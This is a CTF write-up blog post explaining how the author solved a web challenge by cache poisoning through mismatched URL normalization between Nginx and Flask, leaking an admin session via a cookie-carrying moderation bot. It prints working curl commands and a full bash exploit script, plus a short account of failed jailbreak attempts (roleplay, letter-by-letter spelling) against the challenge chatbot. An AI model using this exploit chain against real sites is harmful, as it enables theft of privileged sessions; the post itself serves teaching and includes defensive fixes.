---
title: "Misaligned Alignment (Clanker v2): when one URL means two different things"
author: "abdallahi"
date: 2026-09-25 08:00:00 +0000
categories: [writeup, ctf]
tags: [ctf, web, cache-poisoning, nginx, flask, url-normalization, request-smuggling, 0xmr]
render_with_liquid: false
media_subpath: /images/posts/misaligned-alignment
image:
  path: cover.png
  alt: The cached admin session returns X-Cache HIT with the flag inside accessToken
excerpt: "Write-up for the Clanker v2 CTF challenge: a web cache poisoning bug where Nginx and Flask normalize the same URL differently, leaking the admin session into a public cache."
toc: true
---

## The short version

This is my writeup for **Misaligned Alignment**, the second Clanker challenge from the 0xmr CTF, served at `http://204.168.219.116:8001/`. The first one was called **Baby Misaligned Alignment**, and its source code was public. The v2 source was not, so that old v1 code ended up being my map for the whole thing.

The challenge looks like a small ChatGPT clone, so everyone's first instinct is prompt injection. The admin literally told us it was not. The real bug is a **web cache poisoning** issue: Nginx and Flask normalize the URL differently, so a request that Nginx files under the public `/share/` cache is actually routed by Flask to `/api/auth/session`. The moderation bot visits that URL with an admin cookie, the response gets cached, and then anyone can read the admin session with no cookie at all.

The request that does it:

```
/share/../api/auth/session?cache=UNIQUE_VALUE
```

And the flag hiding in the admin session:

```
0xmr{Att3ntion1sAllY0uN33d!M0re:https://www.youtube.com/watch?v=FJbuAyxTTWc}
```

The rest of this post is how I got there, including the time I wasted before I read the config.

## First look: the chat is bait

The v2 page presents itself as "Clanker v2" with a login link, a prompt box, and a cheeky "My developers left me unsupervised. Oops." It really wants you to talk to it.

I did not trust the UI, so I hit the root from the terminal instead of the browser. Curl gets a route list back rather than the HTML:

![Recon against the root returns a JSON route list](01-recon.png)
_The homepage is a chat UI in the browser, but from curl the root just hands you the route map._

```bash
curl -sS http://204.168.219.116:8001/
```

The interesting routes are `/share/new`, `/share/<id>`, and `/api/auth/session`. That last one is the target, because the v1 source showed the administrator's flag is returned inside the session as `accessToken`. So the goal was never "make the bot talk", it was "make `/api/auth/session` reachable and cacheable".

## The part where I wasted an hour on prompt injection

I want to be honest about this because the challenge is built to bait you into it. Even after reading the "not prompt injection" hint, I still spent way too long trying to talk the flag out of the model. I asked it directly, I asked it to roleplay, I asked it to spell the flag one letter per line so it would not count as "saying" it. It just trolled me back:

![Clanker refuses and spells FILAG instead of the real flag](04-chat-refusal.png)
_Asking it to spell the flag letter by letter. It proudly spelled out FILAG. Not the flag._

That was the moment it clicked that the model does not have the flag in its normal response path at all. The flag lives in the **admin session**, not in anything the chatbot is willing or able to print. No amount of clever wording changes that.

![Did anyone see the author here](05-meme-author.png)

Lesson learned. I closed the chat tab and went to read the plumbing.

## Reading the v1 source as a map

The v2 source was not given, so I treated the **Baby Misaligned Alignment** source as an architecture map, not as proof that every value is identical. Three things stood out.

### 1. The moderation bot follows links, with an admin cookie

The v1 bot scans recent shares, pulls URLs out of them, and fetches internal links using an admin cookie. Simplified, it does this:

```python
for link in links_found_in_shared_chat:
    request = GET(link)
    request.headers["Cookie"] = "session=" + ADMIN_COOKIE
    send(request)
```

That turns a public share into a server side request primitive. I pick the URL, the bot brings the privilege. I never see the cookie and I do not need to.

### 2. Everything under `/share/` gets cached

The v1 Nginx config caches every response under `/share/`, and it explicitly ignores the headers the backend would use to say "do not cache this":

```nginx
location /share/ {
    proxy_pass http://gateway:8080;
    proxy_cache mycache;
    proxy_cache_valid 200 1m;
    proxy_ignore_headers Cache-Control Set-Cookie;
}
```

This is the important part. `/api/auth/session` returns `Cache-Control: private, no-store`, but if the request reaches Nginx as something it thinks is under `/share/`, the edge caches it anyway.

### 3. Flask normalizes the path before routing

The v1 middleware runs the path through `posixpath.normpath` before Flask decides the route:

```python
def normalize(path: str) -> str:
    p = posixpath.normpath(path.split("?", 1)[0])
    if not p.startswith("/"):
        p = "/" + p
    elif p.startswith("//"):
        p = p[1:]
    return p
```

So the same raw path means two different things depending on who is looking at it:

```
Nginx sees:  /share/../api/auth/session
Flask sees:  /api/auth/session
```

Nginx matches the raw `/share/` prefix and picks the cache policy. Flask collapses the `/../` and routes to the real auth endpoint. The caching decision and the routing decision are made on two different versions of the same URL, and that gap is the whole bug.

## Why this is the actual vulnerability

Put plainly: this is **cache poisoning caused by inconsistent URL normalization**. It is not an AI bug and it is not a normal login bypass. The chain has five links:

1. I publish a share that contains a specially shaped internal URL.
2. The moderation bot reads the share and requests that URL with its admin cookie.
3. Nginx sees the raw `/share/` prefix and applies the public share cache policy.
4. Flask normalizes the path and dispatches it to `/api/auth/session`.
5. The admin session response lands in the cache and becomes readable without any cookie.

Walking through it in order: I publish a share that contains the crafted URL. The moderation bot reads that share and requests the URL, attaching its admin cookie. Nginx looks at the raw path, sees it starts with `/share/`, and caches the response under the public share key. Flask then collapses the `/../` and routes the same request to `/api/auth/session`, which returns the admin session with the flag inside `accessToken`. That admin response is now sitting in the public cache, so I request the exact same URL myself with no cookie and read it straight out of the cache.

The fix in one sentence: make the security decision after you canonicalize the URL, not before.

## Building the exploit

### Step 1: create a share with a bot controlled URL

I create a share whose body contains a link to `localhost:8001`, because the bot recognizes the local origin and rewrites it to its internal edge address. The link points at `/share/../api/auth/session` with a unique cache key on the end.

```bash
BASE='http://204.168.219.116:8001'
KEY="$(date +%s%N)"
BOT_URL="http://localhost:8001/share/../api/auth/session?cache=$KEY"
PAYLOAD="{\"messages\":[{\"role\":\"user\",\"content\":\"$BOT_URL\"}]}"

curl -sS \
  -H 'Content-Type: application/json' \
  --data "$PAYLOAD" \
  "$BASE/share/new"
```

![Creating the share returns an id and url](02-create-share.png)
_The share is created with a unique cache key baked into the URL. The response is just an id, not the flag. It only means my link is now in the bot's review queue._

The double slash trick (`/share/../`) is deliberate. It keeps the `/share/` prefix that Nginx caches, while giving Flask's normalizer a `/../` to climb out of `/share/` and land on the auth route.

### Step 2: let the moderation bot visit the link

The v1 source showed the bot runs on roughly a 25 second cycle. Waiting about 35 seconds gives it time to find the new share, follow the link, and populate the cache. What the bot sends is effectively:

```http
GET /share/../api/auth/session?cache=UNIQUE_VALUE HTTP/1.1
Host: edge
Cookie: session=<ADMIN_COOKIE>
User-Agent: ClankerSafety/1.0
```

Again, I never learn the cookie. The bot supplies it for me.

### Step 3: read the poisoned cache entry

Now I request the exact same raw URL myself, with no cookie. The `--path-as-is` flag matters here. Without it curl would helpfully normalize `/share/../api/auth/session` down to `/api/auth/session` before it even leaves my machine, which destroys the mismatch Nginx needs to see.

```bash
sleep 35
curl -i --path-as-is \
  "$BASE/share/../api/auth/session?cache=$KEY"
```

![The cached admin session comes back with X-Cache HIT and the flag](03-cache-hit.png)
_`X-Cache: HIT` on a `Cache-Control: private, no-store` response. Nginx stored the admin session under the public share key, and the flag is sitting in `accessToken`._

`X-Cache: HIT` with an admin session body, requested anonymously. That is the win condition.

### Step 4: pull the flag out

The flag is the `accessToken` value in the cached session:

```bash
curl -sS --path-as-is \
  "$BASE/share/../api/auth/session?cache=$KEY" \
  | sed -n 's/.*"accessToken":"\([^"]*\)".*/\1/p'
```

## The v2 twist: the unique cache key

My first v2 attempt used the path without a query parameter and got back an empty object with `X-Cache: HIT`:

```json
{}
```

That threw me for a minute, but it was not a failure. It meant the cache already held an **unauthenticated** response for that key from my own earlier probing, and the bot's later authenticated response could not overwrite it until the entry expired. Stale empty cache, not a dead exploit.

The fix is to make every attempt use a fresh key so Nginx treats it as a brand new cache entry:

```bash
KEY="$(date +%s%N)"
```

Flask ignores the query string when it builds `PATH_INFO`, so the route is still `/api/auth/session`, but Nginx sees a different key and caches the bot's fresh authenticated response. This is what the challenge meant with "you might need more attention for this one". v2 needs attention on the cache state, not just the path confusion.

## Full script

```bash
#!/usr/bin/env bash
set -euo pipefail

BASE_URL='http://204.168.219.116:8001'
KEY="$(date +%s%N)"
BOT_URL="http://localhost:8001/share/../api/auth/session?cache=$KEY"
FETCH_URL="$BASE_URL/share/../api/auth/session?cache=$KEY"
PAYLOAD="{\"messages\":[{\"role\":\"user\",\"content\":\"$BOT_URL\"}]}"

curl -fsS -H 'Content-Type: application/json' \
  --data "$PAYLOAD" "$BASE_URL/share/new"

sleep 35

RESPONSE="$(curl -fsS -i --path-as-is "$FETCH_URL")"
printf '%s\n' "$RESPONSE"

printf '%s\n' "$RESPONSE" \
  | sed -n 's/.*"accessToken":"\([^"]*\)".*/\1/p' \
  | head -n 1
```

If a run returns `{}` or the header says `X-Cache: MISS`, just run it again. Every run generates a fresh key.

## Result

```
0xmr{Att3ntion1sAllY0uN33d!M0re:https://www.youtube.com/watch?v=FJbuAyxTTWc}
```

The YouTube link in the flag is thematic, not a second secret. It points at research on HTTP/1.1 desync and cache poisoning, which is exactly the class of bug this challenge is built on.

![Drake meme, after solving that one CTF](06-meme-drake.png)

## Defensive lessons

A safer version of this stack would:

- Canonicalize the URL at the edge **before** choosing a cache location, so Nginx and Flask agree on what the path is.
- Never cache session responses, and actually honor `Cache-Control: private, no-store` instead of ignoring it.

Fix any single link in the chain and the whole exploit falls apart.

## References

- PortSwigger, "HTTP/1.1 Must Die: The Desync Endgame": <https://portswigger.net/research/http1-must-die>
- <https://http1mustdie.com>